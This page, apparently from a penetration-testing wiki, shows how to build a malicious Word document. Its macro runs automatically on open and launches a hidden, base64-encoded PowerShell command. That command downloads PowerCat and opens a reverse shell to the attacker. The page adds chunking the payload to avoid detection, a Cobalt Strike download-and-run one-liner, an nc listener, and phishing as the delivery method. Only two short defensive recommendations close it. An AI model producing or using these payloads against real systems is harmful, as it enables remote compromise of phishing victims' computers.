---
layout: default
title: Microsoft Office Exploit
parent: Windows
nav_order: 9
permalink: /windows/office/
---

# Microsoft Office Exploit
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Vulnerability

Microsoft Office documents like Word can be configured to execute macros. These macros can interact with the Windows system. Microsoft Office exploit consists in taking advantage of these macros to gain an access to the targeted Windows system.

## Prerequisites

* Find a way to make your custom Word opened on the target (by doing Phishing for example).

## Exploit

Create a `.docm` or `.doc` Microsoft Word document and create a new macro.

{: .important }
> Macros are not enabled in `.docx` documents.
> You should prefer using `.doc` since `.docm` are more monitored by systems.

```bash
' Macro is automatically executed when the document is opened '
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

' Declare a string and execute it as a system command '
Sub MyMacro()
    Dim Str As String
    CreateObject("Wscript.Shell").Run Str
End Sub
```

Once the macro is ready, create a payload that will download `PowerCat` and execute it on the target machine. Don't forget to encode it in base64.

```powershell
# Payload that download and execute PowerCat.
# This is an example, you can put whatever you want here.
$Payload = ‘IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1");powercat -c $lhost -p $lport -e powershell’

# Then encode it in base64.
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Payload)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText
```

To hide the payload, it’s recommended to trunk it into smaller chunks of 50 characters or more and concatenate them into the `Str` variable in the Microsoft Word macro. You can do it using `python` like below.

```python
# Here, replace 'SQBFAFgAKABOAGUAdwA...' with the content of $EncodedText above
str = "powershell.exe -nop -w hidden -e $EncodedText"

# Trunks of 50 characters
n = 50

for i in range(0, len(str), n):
	print("Str = Str + " + '"' + str[i:i+n] + '"')
```

Then, add the result into the macro.

```bash
Sub MyMacro()
    Dim Str As String
		Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
		Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
		Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
		Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
		Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
		Str = Str + "A== "
    CreateObject("Wscript.Shell").Run Str
End Sub
```

Now, find a way to put this file on your target’s workstation (phishing, download link, etc.) and make him open it to execute the payload. You’ll just need to way with your listener.

```bash
nc -nvlp 4444
```

{: .warning }
> Do not forget to inspect your document in *File > Info > Inspect Document > Inspect Document* to remove all properties that could look suspicious.

If you're using Cobalt Strike, go in *Attacks > Scripted Web Delivery (S)* to generate the payload and a one-liner you can insert in the document directly.

```bash
CreateObject("Wscript.Shell").Run "powershell.exe -nop -w hidden -c ""IEX ((New-Object Net.WebClient).DownloadString('http://$lhost/x'))"""
```

## Useful links

* Microsoft 365 [phishing templates](https://github.com/ZeroPointSecurity/PhishingTemplates/tree/master/Office365) of ZeroPointSecurity.

## Recommendations

- [ ] Enforce EDR on computers to detect and block anormal behavior.
- [ ] Restrict usage of macros in Microsoft Office in your company.